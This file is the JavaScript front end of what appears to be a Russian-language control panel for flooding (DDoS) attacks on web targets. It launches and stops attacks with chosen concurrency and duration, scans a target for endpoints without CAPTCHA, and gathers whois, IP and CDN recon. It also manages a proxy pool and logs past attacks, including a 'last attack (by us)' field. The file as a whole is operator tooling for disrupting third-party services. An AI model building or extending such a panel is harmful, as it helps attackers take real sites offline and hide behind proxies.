// ═══════════════════════════════════════════
// TABS
// ═══════════════════════════════════════════
document.querySelectorAll("nav button[data-tab]").forEach(btn => {
  btn.addEventListener("click", () => {
    document.querySelectorAll("nav button").forEach(b => b.classList.remove("active"));
    btn.classList.add("active");
    const t = btn.dataset.tab;
    document.querySelectorAll(".tab").forEach(s =>
      s.classList.toggle("active", s.id === "tab-" + t)
    );
    if (t === "history") loadHistory();
    if (t === "proxy") updateProxyStatus();
  });
});

// ═══════════════════════════════════════════
// CAPTCHA
// ═══════════════════════════════════════════
let captchaToken = "";
window.onCaptcha = function (token) { captchaToken = token; };

// ═══════════════════════════════════════════
// ATTACK
// ═══════════════════════════════════════════
const targetEl = document.getElementById("target");
const concEl   = document.getElementById("conc");
const concVal  = document.getElementById("conc-val");
const durEl    = document.getElementById("dur");
const logEl    = document.getElementById("log");

concEl.addEventListener("input", () => concVal.textContent = concEl.value);

document.getElementById("btn-start").addEventListener("click", async () => {
  const target = targetEl.value.trim();
  if (!target) return alert("укажи цель");
  const mode = document.querySelector('input[name="mode"]:checked').value;
  const r = await fetch("/api/attack/start", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      target, mode,
      concurrency: parseInt(concEl.value),
      duration: parseInt(durEl.value),
      captcha_token: captchaToken,
    }),
  });
  const j = await r.json();
  if (!j.ok) return alert("ошибка: " + (j.error || "?"));
  logEl.textContent = "";
});

document.getElementById("btn-stop").addEventListener("click", async () => {
  await fetch("/api/attack/stop", { method: "POST" });
});

document.getElementById("btn-scan").addEventListener("click", async () => {
  const target = targetEl.value.trim();
  if (!target) return alert("укажи цель");
  const r = await fetch("/api/scan_endpoints", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ url: target }),
  });
  const j = await r.json();
  if (!j.ok) return alert("ошибка: " + j.error);
  logEl.textContent = "найдено без капчи:\n" +
    j.found.map(f => "  [" + f.status + "] " + f.url).join("\n");
});

// ═══════════════════════════════════════════
// SSE LOG STREAM
// ═══════════════════════════════════════════
const evt = new EventSource("/api/logs/stream");
evt.onmessage = (e) => {
  const d = JSON.parse(e.data);
  if (d.line) {
    logEl.textContent += d.line + "\n";
    logEl.scrollTop = logEl.scrollHeight;
  }
  if (d.state) {
    document.getElementById("st-sent").textContent = d.state.sent.toLocaleString();
    document.getElementById("st-rps").textContent  = d.state.rps.toLocaleString();
    document.getElementById("st-err").textContent  = d.state.errors.toLocaleString();
    document.getElementById("st-time").textContent = d.state.elapsed + "с";
    const dot = document.getElementById("st-dot");
    const txt = document.getElementById("st-text");
    if (d.state.running) {
      dot.classList.add("on");
      txt.textContent = d.state.mode + " → " + d.state.target +
                        "  (" + d.state.concurrency + " потоков)";
    } else {
      dot.classList.remove("on");
      txt.textContent = "простой";
    }
  }
};

// ═══════════════════════════════════════════
// RECON
// ═══════════════════════════════════════════
document.getElementById("btn-recon").addEventListener("click", async () => {
  const host = document.getElementById("recon-host").value.trim();
  if (!host) return;
  const out = document.getElementById("recon-result");
  out.innerHTML = "<p class='muted'>анализирую...</p>";

  const r = await fetch("/api/recon", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ host }),
  });
  const j = await r.json();
  if (!j.ok) { out.innerHTML = "<p class='warn'>" + j.error + "</p>"; return; }

  const d = j.data;
  if (d.error) { out.innerHTML = "<p class='warn'>" + d.error + "</p>"; return; }

  const w = d.whois || {};
  const info = d.ip_info || {};
  const st = d.status || {};

  out.innerHTML = `
    <h3>whois</h3>
    <div class="kv">
      <b>создан</b><span>${w.created || "—"}</span>
      <b>истекает</b><span>${w.expires || "—"}</span>
      <b>обновлён</b><span>${w.updated || "—"}</span>
      <b>регистратор</b><span>${w.registrar || "—"}</span>
      <b>страна</b><span>${w.country || "—"}</span>
      <b>орг</b><span>${w.org || "—"}</span>
      <b>name servers</b><span>${(w.ns || []).join(", ") || "—"}</span>
    </div>

    <h3>ip / хост</h3>
    <div class="kv">
      <b>IP</b><span>${d.ip}</span>
      <b>reverse dns</b><span>${d.reverse_dns}</span>
      <b>страна</b><span>${info.country || "—"}</span>
      <b>город</b><span>${info.city || "—"}</span>
      <b>провайдер (isp)</b><span>${info.isp || "—"}</span>
      <b>организация</b><span>${info.org || "—"}</span>
      <b>asn</b><span>${info.asn || "—"}</span>
      <b>хостинг</b><span>${info.hosting ? "да" : "нет"}</span>
      <b>proxy/vpn</b><span>${info.proxy ? "да" : "нет"}</span>
    </div>

    <h3>dns</h3>
    <div class="kv">
      ${Object.entries(d.dns || {}).map(([k, v]) =>
        `<b>${k}</b><span>${v.join(", ")}</span>`).join("") || "<b>—</b><span>пусто</span>"}
    </div>

    <h3>статус</h3>
    <div class="kv">
      <b>живой</b><span class="${st.alive === "да" ? "ok" : "warn"}">${st.alive}</span>
      <b>задержка</b><span>${st.latency_ms} мс</span>
      <b>cdn</b><span>${st.cdn}</span>
      <b>под атакой</b><span class="${st.under_attack?.includes("норм") ? "ok" : "warn"}">${st.under_attack}</span>
      <b>последняя атака (нами)</b><span>${st.last_attack}</span>
    </div>
  `;
});

// ═══════════════════════════════════════════
// PROXY
// ═══════════════════════════════════════════
document.getElementById("btn-pr-load").addEventListener("click", async () => {
  const r = await fetch("/api/proxy/load", { method: "POST" });
  const j = await r.json();
  alert("загружено: " + j.loaded + " прокси");
  updateProxyStatus();
});

document.getElementById("btn-pr-check").addEventListener("click", async () => {
  const r = await fetch("/api/proxy/check", { method: "POST" });
  const j = await r.json();
  alert(j.ok ? "проверка запущена (1-2 мин)" : j.error);
});

async function updateProxyStatus() {
  const r = await fetch("/api/proxy/status");
  const j = await r.json();
  document.getElementById("pr-loaded").textContent   = j.loaded.toLocaleString();
  document.getElementById("pr-alive").textContent    = j.alive.toLocaleString();
  document.getElementById("pr-dead").textContent     = j.dead.toLocaleString();
  document.getElementById("pr-checking").textContent = j.checking ? "идёт..." : "готов";
}
setInterval(() => {
  if (document.getElementById("tab-proxy").classList.contains("active"))
    updateProxyStatus();
}, 3000);

// ═══════════════════════════════════════════
// HISTORY
// ═══════════════════════════════════════════
async function loadHistory() {
  const r = await fetch("/api/attacks");
  const rows = await r.json();
  const tb = document.getElementById("history-body");
  tb.innerHTML = "";
  rows.forEach(a => {
    const tr = document.createElement("tr");
    tr.innerHTML = `
      <td>${a.id}</td>
      <td>${a.target}</td>
      <td>${a.mode}</td>
      <td>${a.concurrency}</td>
      <td>${a.duration}</td>
      <td>${(a.sent || 0).toLocaleString()}</td>
      <td>${(a.errors || 0).toLocaleString()}</td>
      <td>${(a.started_at || "").slice(0, 19).replace("T", " ")}</td>
      <td>${a.status}</td>
      <td>
        <button class="btn-mini" data-id="${a.id}" data-act="logs">логи</button>
        <button class="btn-mini" data-id="${a.id}" data-act="del">×</button>
      </td>
    `;
    tb.appendChild(tr);
  });

  tb.querySelectorAll("button[data-act='logs']").forEach(b => {
    b.addEventListener("click", async () => {
      const r = await fetch(`/api/attacks/${b.dataset.id}/logs`);
      const j = await r.json();
      document.getElementById("history-log").textContent =
        "#" + b.dataset.id + " logs:\n" + (j.logs || []).join("\n");
    });
  });
  tb.querySelectorAll("button[data-act='del']").forEach(b => {
    b.addEventListener("click", async () => {
      if (!confirm("удалить запись #" + b.dataset.id + "?")) return;
      await fetch(`/api/attacks/${b.dataset.id}`, { method: "DELETE" });
      loadHistory();
    });
  });
}
